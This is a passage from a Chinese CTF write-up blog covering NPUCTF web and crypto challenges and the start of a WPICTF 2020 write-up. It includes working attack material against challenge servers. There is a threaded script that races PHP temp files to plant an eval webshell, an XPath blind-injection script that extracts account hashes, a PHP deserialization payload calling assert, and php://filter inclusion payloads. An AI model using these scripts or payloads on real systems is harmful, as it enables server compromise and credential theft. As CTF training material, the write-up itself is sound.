class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>





<h2 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h2><p>给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>









<h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><p>查看源码发现index.bak.php</p>
<p>点进去之后url是<code>http://ha1cyon-ctf.fun:30094/index.bak.php?action=message.php</code></p>
<p>尝试使用伪协议读取源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.bak.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'action'</span>];</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"location:./index.bak.php?action=message.php"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;message.php</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">		&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">		&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">		&lt;link href&#x3D;&quot;static&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;title&gt;X佬留言板&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">			&lt;h1&gt;👴过留声 燕过留名&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;!--			假的navbar--&gt;</span><br><span class="line">			&lt;navbar&gt;</span><br><span class="line">				&lt;ul class&#x3D;&quot;nav nav-tabs&quot;&gt;</span><br><span class="line">				  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">					&lt;a class&#x3D;&quot;nav-link &quot; href&#x3D;&quot;.&#x2F;index.php&quot;&gt;Index&lt;&#x2F;a&gt;</span><br><span class="line">				  &lt;&#x2F;li&gt;</span><br><span class="line">				  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">					&lt;a class&#x3D;&quot;nav-link table-active &quot; href&#x3D;&quot;.&#x2F;message.php&quot;&gt;Message&lt;&#x2F;a&gt;</span><br><span class="line">				  &lt;&#x2F;li&gt;</span><br><span class="line">				  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">					&lt;a class&#x3D;&quot;nav-link&quot; href&#x3D;&quot;.&#x2F;phpinfo.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br><span class="line">				  &lt;&#x2F;li&gt;</span><br><span class="line">				&lt;&#x2F;ul&gt;</span><br><span class="line">			&lt;&#x2F;navbar&gt;</span><br><span class="line">&lt;!--			假的navbar--&gt;</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">				&lt;form id&#x3D;&quot;message-form&quot;&gt;</span><br><span class="line">					&lt;textarea  id&#x3D;&quot;msg&quot; cols&#x3D;&quot;45&quot; rows&#x3D;&quot;3&quot; placeholder&#x3D;&quot;🌶你进群，还不快来👴直接把⚰都给bypass给你看信不信&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//msg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'content-type:application/json'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"msg is too loooong!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/php/"</span>,<span class="string">"?"</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'msg'</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))$_SESSION[<span class="string">'msg'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">'msg'</span>], [<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">'msg'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"还不快去留言！"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>查看源码发现</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>百万前端的NPU报时中心为您报时：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./time.php?source"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击之后得time.php到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>编写脚本经过测试，部分函数被禁用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"phpinfo()"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($c); <span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure>

<p>查看phpinfo被禁用如下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure>

<p>后面查找发现flag在phpinfo中</p>
<h2 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h2><p>url前面加上 view-source:</p>
<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>查看源码得到</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包发现cookie里面有一个hash，直接提交即可。</p>
<p>目录扫描发现了一个dir.php。</p>
<p>提交之后来到了/flflflflag.php，然后立马跳转到404.html。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">window</span>.location.href=<span class="string">"404.html"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET["file"])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用文件包含查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;flflflflag.php</span><br><span class="line">html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;404.html&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">	die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>经过一番查找后，考点是这个<a href="https://www.anquanke.com/post/id/183046" target="_blank" rel="noopener">PHP临时文件机制与利用的思考</a></p>
<p>利用<a href="https://www.anquanke.com/member/144041" target="_blank" rel="noopener">Mote</a>师傅github中的脚本<a href="https://github.com/Mote-Z/PHP-Is-The-Best/blob/master/PHP_Tempfile_Exploit/POC1/upload.py" target="_blank" rel="noopener">poc1</a>,</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">'http://fa1203f5-0c7d-4e2f-8674-c614670aa93f.node3.buuoj.cn/flflflflag.php?file=flflflflag.php'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span> + str(i): (<span class="string">'webshell'</span>, <span class="string">'@&lt;?php @eval($_GET[1]);?&gt;'</span> + <span class="string">'test'</span> + str(i), <span class="string">'text/php'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            r = s.post(url=url, headers=header, files=files)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        print(<span class="string">'Connection Error'</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    workers = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        worker = threading.Thread(target=upload_file, args=())</span><br><span class="line">        worker.start()</span><br><span class="line">        workers.append(worker)</span><br><span class="line">    <span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">        worker.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>一直跑，然后在dir.php查看目录文件，再包含shell进去。</p>
<p><img src="/pic/166.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpylUNtT&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p>发现flag在phpinfo中。</p>
<p><img src="/pic/166.png" alt=""></p>
<h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>打开题目，是一个登陆框，随意发送数据后抓包发现传入的数据是xml格式的，猜测是xpath注入。</p>
<p><img src="/pic/164.png" alt=""></p>
<p>于是尝试xpath注入万能密码,失败。尝试盲注。发现只能提交一次数据就要刷新。</p>
<p>当语句执行正确时（<code>&#39; or count(/)=1 or &#39;1</code>），提示非法操作</p>
<p><img src="/pic/165.png" alt=""></p>
<p>当语句错误时（<code>&#39; or count(/)=2 or &#39;1</code>）,提示账号或密码错误。</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">se = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    pattern = <span class="string">'id="token" value="(.*?)" /&gt;'</span></span><br><span class="line">    url = <span class="string">'http://94b8372f-c5d8-4348-afa2-522c9b88f1d8.node3.buuoj.cn/login.php'</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    username = payload</span><br><span class="line">    password = <span class="string">'123'</span></span><br><span class="line">    data = <span class="string">"&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;token&gt;"</span> + \</span><br><span class="line">           re.findall(pattern, se.get(url).text)[<span class="number">0</span>] + <span class="string">"&lt;/token&gt;"</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    html = se.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="comment"># print(html.text)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(s_payload, len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len:</span><br><span class="line">        dic = string.printable</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'text()'</span> <span class="keyword">in</span> s_payload:</span><br><span class="line">                payload = <span class="string">"' or substring(%s,%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">"' or substring(name(%s),%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span class="line">            <span class="comment"># payload = "' or substring(name(%s), %d, 1)='%s' or '1" % (s_payload, x, s)</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x = x - <span class="number">1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html = res.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span>:</span><br><span class="line">            result += s</span><br><span class="line">            print(result)</span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_root</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">"/*[1]"</span></span><br><span class="line">    root = search(s_payload)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_define</span><span class="params">(strs)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'%s'</span> % strs</span><br><span class="line">    tables = search(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_root()  #root</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]")  #accounts</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]") # user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[1]")  #id</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[2]")  #usernmae</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[3]")  #password</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[2]/text()") #guest</span></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[3]/text()")  #e10adc3949ba59abbe56e057f20f883e</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[2]/*[2]/text()")  #adm1n</span></span><br><span class="line">    self_define(<span class="string">"/root/*[1]/*[2]/*[3]/text()"</span>)  <span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br></pre></td></tr></table></figure>

<p>将密码解码得到 guest/123456. Adm1n/gtfly123</p>
<p>发现链接是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;welcome</span><br></pre></td></tr></table></figure>

<p>常见的文件包含形式,读取welcom源码，发现过滤了php,base，大写绕过即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;welcome</span><br></pre></td></tr></table></figure>

<p>得到提示，flag is  in /flag</p>
<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>



<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical Cipher"></a>Classical Cipher</h2><p>打开文件，key.txt内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解密后的flag请用flag&#123;&#125;包裹</span><br><span class="line"></span><br><span class="line">压缩包密码：gsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure>

<p>目测凯撒，或者维吉尼亚密码，丢进quipquip，得到密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the_key_is_atbash</span><br></pre></td></tr></table></figure>

<p>之后是一张图片</p>
<p>j  pplj j  k</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>NPUCTF</tag>
        <tag>xpath注入</tag>
        <tag>利用文件包含+php临时缓存拿shell</tag>
      </tags>
  </entry>
  <entry>
    <title>wpictf2020-wp</title>
    <url>/2020/04/18/wpictf2020-wp/</url>
    <content><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="Suckmore-Shell-2-0"><a href="#Suckmore-Shell-2-0" class="headerlink" title="Suckmore Shell 2.0"></a>Suckmore Shell 2.0</h2><p>题目给出了ssh服务器连接上后export不能用了</p>
<a id="more"></a>

<p>Cat、tac、less等之类都能用后面发现od可以使用. <a href="https://www.cnblogs.com/ur10ser/p/7624367.html" target="_blank" rel="noopener">参考链接</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sx@kali blog % ssh smsh@smsh.wpictf.xyz</span><br><span class="line">Password: </span><br><span class="line">&gt; ls</span><br><span class="line">flag</span><br><span class="line">      </span><br><span class="line">&gt; </span><br><span class="line">&gt; od -c flag</span><br><span class="line">0000000   e   c   h   o       <span class="string">"   W   P   I   &#123;   S   U   c   k   m   o</span></span><br><span class="line"><span class="string">0000020   r   e   S   o   f   t   w   a   r   e   N   3   3   d   z   2</span></span><br><span class="line"><span class="string">0000040   G   3   T   i   t   T   o   g   e   T   H   E   R   &#125;   "</span>  \n</span><br><span class="line">0000060</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>





<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="👉😎👉"><a href="#👉😎👉" class="headerlink" title="👉😎👉"></a>👉😎👉</h2><p>这个题目给了一堆emoji</p>
<p><img src="/pic/147.png" alt=""></p>
<p>还给了一个网站</p>
<p><img src="/pic/148.png" alt=""></p>
<p>在attach中有存在ssrf</p>
